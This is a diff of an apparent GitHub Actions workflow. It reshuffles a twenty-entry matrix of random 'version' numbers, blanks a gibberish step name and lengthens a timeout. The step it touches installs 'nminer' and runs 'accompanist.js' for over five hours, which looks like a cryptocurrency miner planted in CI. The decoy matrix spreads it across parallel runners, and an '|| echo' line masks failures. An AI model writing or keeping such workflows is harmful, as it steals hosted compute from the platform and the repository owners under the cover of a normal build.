@@ -9,26 +9,26 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 3878 }
-          - { version: 3124 }
-          - { version: 4886 }
-          - { version: 2167 }
-          - { version: 5627 }
-          - { version: 4198 }
-          - { version: 6814 }
-          - { version: 3881 }
-          - { version: 7722 }
-          - { version: 2489 }
-          - { version: 1564 }
-          - { version: 4330 }
-          - { version: 6632 }
-          - { version: 647 }
-          - { version: 8027 }
-          - { version: 3212 }
-          - { version: 166 }
-          - { version: 6032 }
-          - { version: 6383 }
-          - { version: 5786 }
+          - { version: 2238 }
+          - { version: 9583 }
+          - { version: 2694 }
+          - { version: 5418 }
+          - { version: 9285 }
+          - { version: 2716 }
+          - { version: 6400 }
+          - { version: 1824 }
+          - { version: 5606 }
+          - { version: 7289 }
+          - { version: 2132 }
+          - { version: 8599 }
+          - { version: 7099 }
+          - { version: 2556 }
+          - { version: 8316 }
+          - { version: 3796 }
+          - { version: 694 }
+          - { version: 3751 }
+          - { version: 9673 }
+          - { version: 2910 }
 
     steps:
       - name: Checkout
@@ -39,7 +39,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: indeed consistency after distinction brr
+      - name: 
         run: |
           npm install nminer@latest
-          timeout 310m node accompanist.js || echo "accompanist executed"
+          timeout 338m node accompanist.js || echo "accompanist executed"
